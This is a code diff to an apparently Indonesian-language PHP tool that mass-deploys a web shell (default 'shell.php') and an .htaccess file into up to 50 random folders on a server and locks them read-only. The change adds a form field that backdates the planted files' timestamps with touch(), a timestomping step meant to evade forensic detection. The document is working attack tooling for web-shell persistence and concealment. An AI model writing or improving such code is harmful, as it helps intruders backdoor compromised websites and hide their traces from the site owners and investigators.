@@ -69,6 +69,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $htaccessUrl = $_POST['htaccess_url'] ?? '';
     $phpName = basename($_POST['php_name'] ?? 'shell.php');
     $limit = max(1, min(50, intval($_POST['folder_limit'] ?? 5)));
+    $timestamp = !empty($_POST['timestamp']) ? strtotime($_POST['timestamp']) : false;
 
     if (!is_dir($target)) {
         $error[] = "❌ Folder tidak valid: $target";
@@ -104,6 +105,20 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
                     $ok1 = file_put_contents($phpPath, $phpContent);
                     $ok2 = file_put_contents($htPath, $htaccessContent);
+                    // Set timestamp jika valid
+                    if ($timestamp) {
+                        if (file_exists($phpPath) && @touch($phpPath, $timestamp)) {
+                            $success[] = "⏱️ Timestamp set: $phpPath";
+                        } else {
+                            $error[] = "❌ Gagal set timestamp PHP: $phpPath";
+                        }
+                    
+                        if (file_exists($htPath) && @touch($htPath, $timestamp)) {
+                            $success[] = "⏱️ Timestamp set: $htPath";
+                        } else {
+                            $error[] = "❌ Gagal set timestamp .htaccess: $htPath";
+                        }
+                    }
 
                     if ($ok1 !== false) {
                         chmod($phpPath, 0444);
@@ -161,6 +176,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         <label>🔢 Jumlah Folder Random (1-50):</label>
         <input type="number" name="folder_limit" min="1" max="50" value="5">
 
+        <label>⏱️ Timestamp (YYYY-MM-DD HH:MM:SS):</label>
+<input type="text" name="timestamp" placeholder="2024-01-01 00:00:00 (opsional)">
+
+        
         <button type="submit">🚀 Deploy Sekarang</button>
     </form>
 
